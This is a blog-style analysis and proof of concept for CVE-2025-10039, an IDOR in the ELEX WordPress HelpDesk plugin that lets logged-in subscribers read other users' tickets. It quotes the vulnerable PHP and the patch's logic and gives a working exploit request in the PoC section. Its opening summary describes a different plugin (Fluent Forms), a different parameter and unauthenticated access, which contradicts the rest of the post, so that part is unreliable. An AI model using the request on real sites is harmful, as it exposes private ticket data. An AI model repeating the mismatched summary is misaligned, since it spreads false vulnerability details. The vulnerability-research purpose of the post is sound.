---
title: CVE-2025-10039 Analysis & POC
description: Security Vulnerability in WordPress ELEX WordPress HelpDesk & Customer Ticketing System Plugin.
date: 2025-12-28 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, idor]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Fluent Forms – Customizable Contact Forms, Survey, Quiz, & Conversational Form Builder** contains an **Insecure Direct Object Reference (IDOR)** vulnerability in all versions **≤ 3.2.9** via the `submission_id` parameter in the SCA payment confirmation endpoint.
The vulnerability allows **unauthenticated users** to **mark other users’ submissions as failed**, disrupting the payment process.

* **CVE ID**: [CVE-2025-10039](https://www.cve.org/CVERecord?id=CVE-2025-10039)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 3.2.9
* **Patched Versions**: 3.3.0
* **CVSS severity**: Low (4.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress ELEX WordPress HelpDesk & Customer Ticketing System Plugin](https://wordpress.org/plugins/elex-helpdesk-customer-support-ticket-system/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **ELEX WordPress HelpDesk & Customer Ticketing System**:  
    * `3.2.9` – **vulnerable**  
    * `3.3.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Analysis 
The plugin registers an AJAX handler **for authenticated users**:

```php {title="class-crm-ajax-functions.php v3.2.9" data-open=true hl_lines=[]}
add_action( 'wp_ajax_eh_crm_ticket_single_view_client', array( 'CRM_Ajax', 'eh_crm_ticket_single_view_client' ) );
```

`wp_ajax_` is a hook for authenticated users (Subscriber+). When a request is sent to `/wp-admin/admin-ajax.php` with the parameter `action=eh_crm_ticket_single_view_client`, the callback `eh_crm_ticket_single_view_client` is executed:

```php {title="class-crm-ajax-functions.php v3.2.9" data-open=true hl_lines=[4]}
public static function eh_crm_ticket_single_view_client() {
    if ( wp_verify_nonce( isset( $_POST['nonce'] ) ? sanitize_text_field( $_POST['nonce'] ) : '', 'wsdesk_nonce' ) ) {
        $ticket_id = isset( $_POST['ticket_id'] ) ? sanitize_text_field( $_POST['ticket_id'] ) : '';
        $content   = self::eh_crm_ticket_single_view_client_gen( $ticket_id );
        wp_send_json_success( array( 'page' => $content ) );
        die;
    }
}
```

This function verifies the `nonce` to mitigate CSRF attacks.

It then extracts `ticket_id` from the request and calls `eh_crm_ticket_single_view_client_gen()` to retrieve the ticket content.

Finally, the response is returned as JSON.

```php {title="class-crm-ajax-functions.php v3.2.9" data-open=true hl_lines=[]}
public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) {

    // Fetch ticket data based on user-supplied ticket_id
    $current      = eh_crm_get_ticket( array( 'ticket_id' => $ticket_id ) );
    $current_meta = eh_crm_get_ticketmeta( $ticket_id );

    // Fetch internal users (agent/admin)
    $users_data = get_users( array(
        'role__in' => array( 'administrator', 'WSDesk_Agents', 'WSDesk_Supervisor' )
    ));

    ...

    // Render ticket content (HTML output)
    echo esc_html( $current[0]['ticket_title'] );
    echo esc_html( $current[0]['ticket_email'] );
    echo esc_html( $current[0]['ticket_date'] );

    ...

    // Render conversation, attachments, metadata
    self::eh_crm_ticket_reply_section_gen_client( $ticket_id );

    ...

    return ob_get_clean();
}
```

The functions `eh_crm_ticket_single_view_client_gen` and `eh_crm_get_ticketmeta` are used to retrieve ticket data:

```php {title="class-crm-public-functions.php v3.2.9" data-open=true hl_lines=[]}
function eh_crm_get_ticket( $args, $fields = null ) {
	set_time_limit( 300 );
	$query = wpFluent()->table( tables: 'wsdesk_tickets' )->where( 'ticket_trash', 0 );

	if ( null !== $fields ) {
		$fields = is_array( $fields ) ? $fields : array( $fields );
		foreach ( $fields as $field ) {
			$query->select( $field );
		}
	}

	if ( is_array( $args ) ) {
		foreach ( $args as $key => $value ) {
			$allowed_fileds = array( 'ticket_id', 'ticket_author', 'ticket_email', 'ticket_date', 'ticket_title', 'ticket_parent', 'ticket_category', 'ticket_vendor', 'ticket_trash' );
			if ( in_array( $key, $allowed_fileds, true ) ) {
				$query->where( $key, $value );
			}
		}
	}

	$ticket = (array) $query->first();

	if ( ! $ticket ) {
		return false;
	}

	if ( isset( $ticket['ticket_content'] ) ) {
		$ticket['ticket_content'] = wp_kses_post( $ticket['ticket_content'] );
	}

	return array( $ticket );
}
```


```php {title="class-crm-public-functions.php v3.2.9" data-open=true hl_lines=[]}
function eh_crm_get_ticketmeta( $id, $key = null ) {
	set_time_limit( 300 );
	global $wpdb;
	$data     = $wpdb->get_results( $wpdb->prepare( 'SELECT meta_key,meta_value FROM ' . $wpdb->prefix . 'wsdesk_ticketsmeta WHERE ticket_id = %d', (int) $id ), ARRAY_A );
	$retrived = array();
	if ( null !== $key ) {
		$data = $wpdb->get_results( $wpdb->prepare( 'SELECT meta_key,meta_value FROM ' . $wpdb->prefix . 'wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s', (int) $id, $key ), ARRAY_A );
	}
	if ( ! $data ) {
		return false;
	}
	if ( null !== $key ) {
		return maybe_unserialize( $data[0]['meta_value'] );
	}
	for ( $i = 0; $i < count( $data ); $i++ ) {
		$retrived[ $data[ $i ]['meta_key'] ] = maybe_unserialize( $data[ $i ]['meta_value'] );
	}
	return maybe_unserialize( $retrived );
}
```

> [!BUG] There is no validation to ensure the current user is the ticket owner or has permission to view the ticket → IDOR

**Patch v3.3.0**

![Patch](diff.png "Patch v3.3.0")

The patch **prevents IDOR by enforcing user-based access control**, specifically:

* Comparing `ticket_author` with `current_user_id`
* Allowing access only for authorized roles (`administrator`, `WSDesk_Agents`, `WSDesk_Supervisor`)
* Rejecting unauthorized requests before returning data

As a result, tickets cannot be accessed by modifying `ticket_id` alone.

## Flow
{{< mermaid >}}
flowchart TD
A["Authenticated User (Subscriber+)"] 
--> B["Request admin-ajax.php?action=eh_crm_ticket_single_view_client"]

B --> C["Verify nonce"]

C --> D["Get ticket_id from request"]

D --> E["Load ticket by ticket_id"]

E --> F["No ownership check"]
F --> G["No role validation"]

G --> H["Return full ticket data"]

H --> I["User can view other users' tickets (IDOR)"]
{{< /mermaid >}}


## Proof of Concept (PoC)
1. Log in as a Subscriber+ user:
2. Submit any ticket
3. In the `Your Tickets` table, obtain the `nonce` by viewing the page source:

![Nonce](nonce.png "Nonce")

4. Send the following request using the obtained `nonce`:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: Subscriber+ cookie

action=eh_crm_ticket_single_view_client&nonce=4de88a7186&ticket_id=any_ticket_id 
```

**Result**:

![Result](result.png "Result")

The response contains the ticket content and the ticket author's information.

## Conclusion

The vulnerability exists because the `eh_crm_ticket_single_view_client` endpoint **does not verify ticket ownership**, relying solely on the user-supplied `ticket_id`.
This allows any authenticated user to access other users’ tickets → **IDOR**.

The patch mitigates the issue by:

* Comparing `ticket_author` with `current_user_id`
* Allowing access only for authorized roles
* Rejecting unauthorized requests before returning data

## Key Takeaways

* `nonce` **does not replace authorization checks**
* Never trust client-supplied identifiers
* Always validate **ownership** before accessing resources
* Authorization must be enforced server-side before returning responses

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress ELEX WordPress HelpDesk & Customer Ticketing System Plugin <= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/elex-helpdesk-customer-support-ticket-system/vulnerability/wordpress-elex-wordpress-helpdesk-customer-support-ticket-system-plugin-3-2-9-authenticated-subscriber-insecure-direct-object-reference-via-eh-crm-ticket-single-view-client-vulnerability)
